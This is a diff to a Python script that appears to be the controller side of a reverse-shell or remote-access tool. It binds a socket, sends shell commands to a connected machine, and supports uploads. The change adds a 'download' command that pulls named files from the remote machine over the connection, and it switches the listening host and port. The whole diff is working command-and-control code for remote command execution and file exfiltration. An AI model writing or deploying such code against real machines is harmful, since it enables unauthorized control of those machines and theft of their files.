@@ -7,6 +7,29 @@ class bcolors:
     WARNING = '\033[93m'
     ENDC = '\033[0m'
 
+def download_file(command):
+
+    file_name = command[9:]
+    file_bytes = b""
+
+    conn.settimeout(1)
+
+    while True:
+        try:
+            data = conn.recv(1024)
+        except socket.timeout:
+            break
+
+        if file_bytes[-5:] == b"<END>":
+            break
+        else:
+            file_bytes += data
+
+    conn.settimeout(None)
+
+    file = open(file_name,"wb")
+    file.write(file_bytes)
+    file.close()
 
 def upload_file(file_name):
 
@@ -20,8 +43,8 @@ def upload_file(file_name):
 
 if __name__ == '__main__':
 
-    HOST = "192.168.1.102"
-    PORT = 5555
+    HOST = "192.168.1.104"
+    PORT = 5549
 
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     sock.bind((HOST,PORT))
@@ -43,12 +66,15 @@ if __name__ == '__main__':
             if command[:6] == "upload":
                 
                 upload_file(command[7:])
+            
+            if command[:8] == "download":
+                download_file(command)
 
             if command == "exit":
                 print(bcolors.WARNING + "\n[-] QUIT" + bcolors.ENDC)
                 break
                 
-            if command[:2] != "cd" and command[:6] != "upload":
+            if command[:2] != "cd" and command[:6] != "upload" and command[:8] != "download":
                 data = conn.recv(1024)
                 print(data.decode())
 
